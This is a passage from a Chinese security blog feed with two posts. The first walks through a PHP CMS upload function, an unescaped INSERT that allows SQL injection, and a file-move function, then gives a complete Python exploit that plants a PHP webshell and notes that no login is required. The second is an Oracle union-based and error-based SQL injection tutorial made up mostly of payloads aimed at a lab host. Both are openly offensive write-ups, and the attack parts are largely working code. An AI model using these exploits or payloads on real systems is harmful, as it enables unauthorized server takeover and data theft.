class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">private function _upload($input)</span><br><span class="line">    &#123;</span><br><span class="line">        global $app;</span><br><span class="line">        $basename = substr(md5(time().uniqid()),9,16);</span><br><span class="line">        $chunk = $app-&gt;get(&apos;chunk&apos;,&apos;int&apos;);</span><br><span class="line">        $chunks = $app-&gt;get(&apos;chunks&apos;,&apos;int&apos;);</span><br><span class="line">        if(!$chunks)&#123;</span><br><span class="line">            $chunks = 1;</span><br><span class="line">        &#125;</span><br><span class="line">        $tmpname = $_FILES[$input][&quot;name&quot;];</span><br><span class="line">        $tmpid = &apos;u_&apos;.md5($tmpname);</span><br><span class="line">        $ext = $this-&gt;file_ext($tmpname);</span><br><span class="line">        $out_tmpfile = $this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$chunk;</span><br><span class="line">        if (!$out = @fopen($out_tmpfile.&quot;.parttmp&quot;, &quot;wb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输出流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $error_id = $_FILES[$input][&apos;error&apos;] ? $_FILES[$input][&apos;error&apos;] : 0;</span><br><span class="line">        if($error_id)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;$this-&gt;up_error[$error_id]);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!is_uploaded_file($_FILES[$input][&apos;tmp_name&apos;]))&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;上传失败，临时文件无法写入&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        if(!$in = @fopen($_FILES[$input][&quot;tmp_name&quot;], &quot;rb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输入流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        while ($buff = fread($in, 4096)) &#123;</span><br><span class="line">            fwrite($out, $buff);</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose($out);</span><br><span class="line">        @fclose($in);</span><br><span class="line">        $app-&gt;lib(&apos;file&apos;)-&gt;mv($out_tmpfile.&apos;.parttmp&apos;,$out_tmpfile.&apos;.part&apos;);</span><br><span class="line">        $index = 0;</span><br><span class="line">        $done = true;</span><br><span class="line">        for($index=0;$index&lt;$chunks;$index++) &#123;</span><br><span class="line">            if (!file_exists($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&quot;.part&quot;) ) &#123;</span><br><span class="line">                $done = false;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(!$done)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;&apos;上传的文件异常&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">        $outfile = $this-&gt;folder.$basename.&apos;.&apos;.$ext;</span><br><span class="line">        if(!$out = @fopen($this-&gt;dir_root.$outfile,&quot;wb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输出流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        if(flock($out,LOCK_EX))&#123;</span><br><span class="line">            for($index=0;$index&lt;$chunks;$index++) &#123;</span><br><span class="line">                if (!$in = @fopen($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&apos;.part&apos;,&apos;rb&apos;))&#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                while ($buff = fread($in, 4096)) &#123;</span><br><span class="line">                    fwrite($out, $buff);</span><br><span class="line">                &#125;</span><br><span class="line">                @fclose($in);</span><br><span class="line">                $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&quot;_&quot;.$index.&quot;.part&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            flock($out,LOCK_UN);</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose($out);</span><br><span class="line">        $tmpname = $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;string&apos;)-&gt;to_utf8($tmpname);</span><br><span class="line">        $title = str_replace(&quot;.&quot;.$ext,&apos;&apos;,$tmpname);</span><br><span class="line">        return array(&apos;title&apos;=&gt;$title,&apos;ext&apos;=&gt;$ext,&apos;filename&apos;=&gt;$outfile,&apos;folder&apos;=&gt;$this-&gt;folder,&apos;status&apos;=&gt;&apos;ok&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中<strong>$ext = $this-&gt;file_ext($tmpname);</strong>是检测文件后缀的，看一下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private function file_ext($tmpname)</span><br><span class="line">    &#123;</span><br><span class="line">        $ext = pathinfo($tmpname,PATHINFO_EXTENSION);</span><br><span class="line">        if(!$ext)&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = strtolower($ext);</span><br><span class="line">        $filetypes = &quot;jpg,gif,png&quot;;</span><br><span class="line">        if($this-&gt;cate &amp;&amp; $this-&gt;cate[&apos;filetypes&apos;])&#123;</span><br><span class="line">            $filetypes .= &quot;,&quot;.$this-&gt;cate[&apos;filetypes&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">        if($this-&gt;file_type)&#123;</span><br><span class="line">            $filetypes .= &quot;,&quot;.$this-&gt;file_type;</span><br><span class="line">        &#125;</span><br><span class="line">        $list = explode(&quot;,&quot;,$filetypes);</span><br><span class="line">        $list = array_unique($list);</span><br><span class="line">        if(!in_array($ext,$list))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return $ext;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上传是比较严格的，只允许上传后缀是jpg,png,gif这种图片后缀的文件，上传我们无法绕过，但是程序对于上传的文件名没有充份的过滤，在函数末尾，将文件名添加到了返回的数组中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$tmpname = $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;string&apos;)-&gt;to_utf8($tmpname);</span><br><span class="line">        $title = str_replace(&quot;.&quot;.$ext,&apos;&apos;,$tmpname);</span><br><span class="line">        return array(&apos;title&apos;=&gt;$title,&apos;ext&apos;=&gt;$ext,&apos;filename&apos;=&gt;$outfile,&apos;folder&apos;=&gt;$this-&gt;folder,&apos;status&apos;=&gt;&apos;ok&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的$tmpname就是我们上传的文件名，注意，不是上传后的文件名，而是上传前的文件名，并且没有对该文件名过滤，然后返回。</p><p>我们回到开头，upload_base函数中去:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$rs = $this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $array = array();</span><br><span class="line">        $array[&quot;cate_id&quot;] = $rs[&apos;cate&apos;][&apos;id&apos;];</span><br><span class="line">        $array[&quot;folder&quot;] = $rs[&apos;folder&apos;];</span><br><span class="line">        $array[&quot;name&quot;] = basename($rs[&apos;filename&apos;]);</span><br><span class="line">        $array[&quot;ext&quot;] = $rs[&apos;ext&apos;];</span><br><span class="line">        $array[&quot;filename&quot;] = $rs[&apos;filename&apos;];</span><br><span class="line">        $array[&quot;addtime&quot;] = $this-&gt;time;</span><br><span class="line">        $array[&quot;title&quot;] = $rs[&apos;title&apos;];</span><br><span class="line">        $array[&apos;session_id&apos;] = $this-&gt;session-&gt;sessid();</span><br><span class="line">        $array[&apos;user_id&apos;] = $this-&gt;session-&gt;val(&apos;user_id&apos;);</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))&#123;</span><br><span class="line">            $img_ext = getimagesize($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">            $array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        &#125;</span><br><span class="line">        $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array);</span><br></pre></td></tr></table></figure><p>可以看到这里将返回值中的title的值赋值给了$array[‘title’],这个值是我们可控的，然后将$array带入到了save函数中，我们看一下该函数:</p><p>在/framework/model/res.php中第279行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function save($data,$id=0)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$data || !is_array($data))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if($id)&#123;</span><br><span class="line">            return $this-&gt;db-&gt;update_array($data,&quot;res&quot;,array(&quot;id&quot;=&gt;$id));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $this-&gt;db-&gt;insert_array($data,&quot;res&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将$data带入到了insert_array函数中，我们看一下该函数:</p><p>/framework/engine/db/mysqli.php中第211行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public function insert_array($data,$tbl,$type=&quot;insert&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$tbl || !$data || !is_array($data))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(substr($tbl,0,strlen($this-&gt;prefix)) != $this-&gt;prefix)&#123;</span><br><span class="line">            $tbl = $this-&gt;prefix.$tbl;</span><br><span class="line">        &#125;</span><br><span class="line">        $type = strtolower($type);</span><br><span class="line">        $sql = $type == &apos;insert&apos; ? &quot;INSERT&quot; : &quot;REPLACE&quot;;</span><br><span class="line">        $sql.= &quot; INTO &quot;.$tbl.&quot; &quot;;</span><br><span class="line">        $sql_fields = array();</span><br><span class="line">        $sql_val = array();</span><br><span class="line">        foreach($data AS $key=&gt;$value)&#123;</span><br><span class="line">            $sql_fields[] = &quot;`&quot;.$key.&quot;`&quot;;</span><br><span class="line">            $sql_val[] = &quot;&apos;&quot;.$value.&quot;&apos;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $sql.= &quot;(&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</span><br><span class="line">        return $this-&gt;insert($sql);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是将该数组中的键值遍历出来，将键作为字段名，将值作为对应字段的值。可以看到，对于值是没有进行转义的，其中包括我们可以控制的title的值，那么这里就产生了一个insert的注入。那么这个注入我们有什么用呢？当然首先想到的是一个出数据，但是对于update 或者insert注入，一般来说我会想办法将这个注入升级一下危害。注意这个注入是一个insert注入，并且insert语句是可以一次插入多条内容的，我们不能控制当前这条insert语句的内容，我们可以控制下一条的内容，比如说像这样:<br>Insert into file values(1,2,3,),(4,5,6)<br>那么我们控制下一条的内容有什么用，好，现在我们开始看/framework/www/upload_control.php中的第103行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public function replace_f()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;popedom();</span><br><span class="line">        $id = $this-&gt;get(&quot;oldid&quot;,&apos;int&apos;);</span><br><span class="line">        if(!$id)&#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;没有指定要替换的附件&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $old_rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        if(!$old_rs)&#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;资源不存在&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;upload(&apos;upfile&apos;);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;附件上传失败&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        $my_ext = array();</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))</span><br><span class="line">        &#123;</span><br><span class="line">            $img_ext = getimagesize($rs[&quot;filename&quot;]);</span><br><span class="line">            $my_ext[&quot;width&quot;] = $img_ext[0];</span><br><span class="line">            $my_ext[&quot;height&quot;] = $img_ext[1];</span><br><span class="line">        &#125;</span><br><span class="line">        //替换资源</span><br><span class="line">        $this-&gt;lib(&apos;file&apos;)-&gt;mv($rs[&quot;filename&quot;],$old_rs[&quot;filename&quot;]);</span><br><span class="line">        $tmp = array(&quot;addtime&quot;=&gt;$this-&gt;time);</span><br><span class="line">        $tmp[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;save($tmp,$id);</span><br><span class="line">        //更新附件扩展信息</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id);</span><br><span class="line">        $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        $this-&gt;json($rs,true);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们输入一个oldid的值，然后从res表中查找出这一行的数据，然后将我们上传的文件mv到$old_rs[‘filename’]。<br>mv函数的定义在/framework/libs/file.php中第264行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function mv($old,$new,$recover=true)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!file_exists($old))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(substr($new,-1) == &quot;/&quot;)&#123;</span><br><span class="line">            $this-&gt;make($new,&quot;dir&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;make($new,&quot;file&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(file_exists($new))&#123;</span><br><span class="line">            if($recover)&#123;</span><br><span class="line">                unlink($new);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $new = $new.basename($old);</span><br><span class="line">        &#125;</span><br><span class="line">        rename($old,$new);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过上文说到的，我们可以控制res表中的一行记录的值，那么这个filename也是我们可控的，那么我们如果将filename设置为/res/balisong.php。那么我上传的图片文件就会重新命名成/res/balisong.php。我们就达到了一个getshell的目的。</p><p>由于上传的文件名的特殊性。导致我们不能带有斜杠，那么怎么办呢？我们可以利用十六进制编码来绕过，具体的漏洞利用过程就不细说了，比较复杂，所以直接上exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">\#-*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">if len(sys.argv) &lt; 2:</span><br><span class="line">    print u&quot;Usage: exp.py url [PHPSESSION]\r\nFor example:\r\n[0] exp.py http://localhost\r\n[1] exp.py http://localhost 6ogmgp727m0ivf6rnteeouuj02&quot;</span><br><span class="line">    exit()</span><br><span class="line">baseurl = sys.argv[1]</span><br><span class="line">phpses = sys.argv[2] if len(sys.argv) &gt; 2 else &apos;&apos;</span><br><span class="line">cookies = &#123;&apos;PHPSESSION&apos;: phpses&#125;</span><br><span class="line">if baseurl[-1] == &apos;/&apos;:</span><br><span class="line">    baseurl = baseurl[:-1]</span><br><span class="line">url = baseurl + &apos;/index.php?c=upload&amp;f=save&apos;</span><br><span class="line">files = [</span><br><span class="line">    (&apos;upfile&apos;, (&quot;1&apos;,&apos;r7ip15ijku7jeu1s1qqnvo9gj0&apos;,&apos;30&apos;,&apos;&apos;),(&apos;1&apos;,0x7265732f3230313730352f32332f,0x393936396465336566326137643432352e6a7067,&apos;&apos;,0x7265732f62616c69736f6e672e706870,&apos;1495536080&apos;,&apos;2.jpg&quot;,</span><br><span class="line">                &apos;&lt;?php phpinfo();?&gt;&apos;, &apos;image/jpg&apos;)),</span><br><span class="line">]</span><br><span class="line">files1 = [</span><br><span class="line">    (&apos;upfile&apos;,</span><br><span class="line">     (&apos;1.jpg&apos;, &apos;&lt;?php phpinfo();?&gt;&apos;, &apos;image/jpg&apos;)),</span><br><span class="line">]</span><br><span class="line">r = requests.post(url, files=files, cookies=cookies)</span><br><span class="line">response = r.text</span><br><span class="line">id = re.search(&apos;&quot;id&quot;:&quot;(\d+)&quot;&apos;, response, re.S).group(1)</span><br><span class="line">id = int(id) + 1</span><br><span class="line">url = baseurl + &apos;/index.php?c=upload&amp;f=replace&amp;oldid=%d&apos; % (id)</span><br><span class="line">r = requests.post(url, files=files1, cookies=cookies)</span><br><span class="line">shell = baseurl + &apos;/res/balisong.php&apos;</span><br><span class="line">response = requests.get(shell)</span><br><span class="line">if response.status_code == 200:</span><br><span class="line">    print &quot;congratulation:Your shell:\n%s\npassword:balisong&quot; % (shell)</span><br><span class="line">else:</span><br><span class="line">    print &quot;oh!Maybe failed.Please check&quot;</span><br></pre></td></tr></table></figure><p>系统默认是不需要注册登录即可上传文件的。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>其实这种情况还是蛮多的，有些系统会将上传前的文件名入库，如果过滤不当，就可以注入了。并且insert，update这种注入危害是可以进一步扩大的。</p><p>转载于<a href="https://xz.aliyun.com/t/1569/#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/1569/#toc-1</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Oracle注入-报错注入</title>
      <link href="/2019/12/07/oracle%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/12/07/oracle%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="Oracle-报错注入"><a href="#Oracle-报错注入" class="headerlink" title="Oracle 报错注入"></a>Oracle 报错注入</h2><p>进行测试或漏洞挖掘的时候发现出现了数据库报错信息，可以优先选择报错注入，报错注入就是使用报错的方式将查询数据的结果带出到错误页面中，使用报错注入需要使用类似 1=[报错语句]，1&gt;[报错语句]，使用比较运算符，这样的方式进行报错注入（MYSQL仅使用函数报错即可）</p><h2 id="注入小提示"><a href="#注入小提示" class="headerlink" title="注入小提示"></a>注入小提示</h2><ul><li>Oracle 使用查询语句获取数据时需要跟上表名</li><li>没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则.</li><li>Oracle保证dual里面永远只有一条记录。</li><li>填充字段数要用null填充</li><li>Oracle的单行注释符号是–</li></ul><p>oracle注入我们首先想到的是联合查询注入：</p><h2 id="oracle联合查询的注入步骤："><a href="#oracle联合查询的注入步骤：" class="headerlink" title="oracle联合查询的注入步骤："></a>oracle联合查询的注入步骤：</h2><ul><li>判断字段数(一些闭合注释)：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;order by 4--</span><br></pre></td></tr></table></figure><ul><li>通过测试数据类型来判断回显位置(发现可输出字符串的为2,3,4个字段)：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union all select null,&apos;null&apos;,&apos;null&apos;,&apos;null&apos; from dual--</span><br></pre></td></tr></table></figure><ul><li>获取数据库版本信息：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union all select null,(select banner from  sys.v_$version where rownum=1),null,null from dual --</span><br></pre></td></tr></table></figure><ul><li>获取表名:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union all select null,(select table_name from user_tables where table_name=&apos;ADMIN&apos; and rownum=1),null,null from dual --</span><br></pre></td></tr></table></figure><ul><li>获取关键表中的列名(我们可以通过<strong>and 字段名&lt;&gt;字段值</strong>来排除不想要的字段名，就是说将 字段名=指定字段值进行排除)：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tab_columns where rownum=1),null from dual --</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;ID&apos;),null from dual --</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tables where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos;),null from dual --</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tables where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos; and column_name&lt;&gt;&apos;PASSWORD&apos;),null from dual --</span><br></pre></td></tr></table></figure><p>通过逐步排除来得到自己所想要的字段名；</p><ul><li>再获取关键字段中的字段数据</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select FLAG_FLAG from admin --</span><br></pre></td></tr></table></figure><h2 id="oracle-报错注入"><a href="#oracle-报错注入" class="headerlink" title="oracle 报错注入"></a>oracle 报错注入</h2><ul><li>CTXSYS.DRITHSX.SN()</li></ul><p>去查询关于主题的对应关键词，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误从而爆出查询内容，我们可以通过这个函数将查询内容通过报错爆出查询内容；</p><ul><li>oracle注入的一些数据库语句：</li></ul><p>select bannner from sys.v_$version where rownum=1     查询数据库版本；</p><p>select table_name from user_tables where rownum=1  查询表名；</p><p>select column_name from user_tab_columns where table_name=’ADMIN’ and rownum=1  查询字段名；</p><p>select [字段] from [表名]  查询内容；</p><p>select * from all_table 查询出所有表；</p><p>select * from user_tables 查询出当前用户的表；</p><p>select * from all_tab_columns  查询所有的字段；</p><p>select * from user_tab_columns 查询当前用户的字段；</p><h2 id="oracle-报错注入的步骤："><a href="#oracle-报错注入的步骤：" class="headerlink" title="oracle 报错注入的步骤："></a>oracle 报错注入的步骤：</h2><ul><li>闭合注释语句：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos;--</span><br></pre></td></tr></table></figure><ul><li>查询表名：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询第一个字段：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询除ID外的字段，并返回一行结果：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询除ID、USER_NAME外的字段，并返回一行结果：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询除ID、USER_NAME、PASSWORD外的字段，并返回一行结果：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos; and column_name&lt;&gt;&apos;PASSWORD&apos; and 